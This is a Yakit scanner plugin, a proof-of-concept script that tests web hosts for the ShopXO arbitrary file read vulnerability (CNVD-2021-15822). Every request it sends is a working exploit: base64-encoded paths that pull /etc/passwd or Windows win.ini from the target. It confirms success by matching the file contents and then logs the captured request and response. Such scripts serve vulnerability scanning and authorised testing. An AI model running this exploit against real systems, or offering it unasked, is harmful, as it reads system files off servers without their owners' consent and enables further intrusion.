yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="ShopXO存在任意文件读取漏洞（CNVD-2021-15822）"
    severity=""
    type="漏洞"

    poc_url_Linux0= url + `/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=`
    req_Linux0, _ := http.NewRequest("GET",poc_url_Linux0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_Linux0)
    resp_Linux0, err := http.Do(req_Linux0)
    die(err)
    bresp,_=http.dump(resp_Linux0)
    header, body = poc.Split(bresp)
    Linux0_flag = false
    if resp_Linux0.StatusCode == 200 && re.Match(`root:[x*]:0:0:`,string(body)){
        Linux0_flag = true
    }

    poc_url_Windows0= url + `/public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=`
    req_Windows0, _ := http.NewRequest("GET",poc_url_Windows0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_Windows0)
    resp_Windows0, err := http.Do(req_Windows0)
    die(err)
    bresp,_=http.dump(resp_Windows0)
    header, body = poc.Split(bresp)
    Windows0_flag = false
    if resp_Windows0.StatusCode == 200 && str.Contains(string(body),"extensions") && str.Contains(string(body),"for 16-bit app support"){
        Windows0_flag = true
    }

    poc_url=poc_url_Windows0
    if Linux0_flag || Windows0_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
